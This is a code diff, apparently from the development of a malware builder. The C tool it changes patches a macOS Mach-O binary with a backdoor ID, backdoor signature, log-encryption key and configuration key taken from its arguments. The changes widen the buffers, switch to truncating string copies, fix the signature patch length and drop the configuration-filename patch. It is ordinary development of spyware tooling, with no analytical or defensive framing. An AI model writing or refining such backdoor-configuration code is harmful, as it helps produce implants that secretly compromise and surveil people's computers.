@@ -22,10 +22,10 @@
 HANDLE hMachoFile;
 HANDLE hMappedFile;
 
-CHAR szBackdoorID[32];
-CHAR szBackdoorSignature[64];
-CHAR szLogKey[64];
-CHAR szConfigurationKey[64];
+CHAR szBackdoorID[256];
+CHAR szBackdoorSignature[256];
+CHAR szLogKey[256];
+CHAR szConfigurationKey[256];
 CHAR szBackdoorName[256];
 CHAR szWorkingMethod[32];
 CHAR szFilename[MAX_PATH];
@@ -163,7 +163,7 @@ patchMachoFile ()
 	if (patchValue (pBlockPtr,
                   iLen,
                   (BYTE *)szBackdoorSignature,
-                  strlen(szBackdoorSignature),
+                  SIGNATURE_MARK_LEN,
                   SIGNATURE_MARK,
                   SIGNATURE_MARK_LEN) != kSuccess)
     {
@@ -187,20 +187,6 @@ patchMachoFile ()
     }
 
   printf("[x] Backdoor ID patched\n");
-
-	// Patching nome file configurazione
-	if (patchValue (pBlockPtr,
-                  iLen,
-                  (BYTE *)CONFIG_FILENAME,
-                  strlen(CONFIG_FILENAME),
-                  CONFIG_NAME_MARK,
-                  CONFIG_NAME_MARK_LEN) != kSuccess)
-    {
-      unloadMachO (pBlockPtr);
-      return kPatchFlcError;
-    }
-
-  printf("[x] Configuration filename patched\n");
   
   if (patchValue (pBlockPtr,
                   iLen,
@@ -232,13 +218,13 @@ parseArguments (int argc, TCHAR **argv)
       return kArgError;
     }
 
-  sprintf_s (szBackdoorID, sizeof(szBackdoorID), "%s", argv[1]);
-  sprintf_s (szLogKey, sizeof(szLogKey), "%s", argv[2]);
-  sprintf_s (szConfigurationKey, sizeof(szConfigurationKey), "%s", argv[3]);
-  sprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), "%s", argv[4]);
-  sprintf_s (szFilename, sizeof(szFilename), "%s", argv[5]);
-  sprintf_s (szWorkingMethod, sizeof(szWorkingMethod), "%s", argv[6]);
-  sprintf_s (szOutFilename, sizeof(szOutFilename), "%s", argv[7]);
+  _snprintf_s (szBackdoorID, sizeof(szBackdoorID), _TRUNCATE, "%s", argv[1]);
+  _snprintf_s (szLogKey, sizeof(szLogKey), _TRUNCATE, "%s", argv[2]);
+  _snprintf_s (szConfigurationKey, sizeof(szConfigurationKey), _TRUNCATE, "%s", argv[3]);
+  _snprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), _TRUNCATE, "%s", argv[4]);
+  _snprintf_s (szFilename, sizeof(szFilename), _TRUNCATE, "%s", argv[5]);
+  _snprintf_s (szWorkingMethod, sizeof(szWorkingMethod), _TRUNCATE, "%s", argv[6]);
+  _snprintf_s (szOutFilename, sizeof(szOutFilename), _TRUNCATE, "%s", argv[7]);
   
   //
   //  Sanity checks
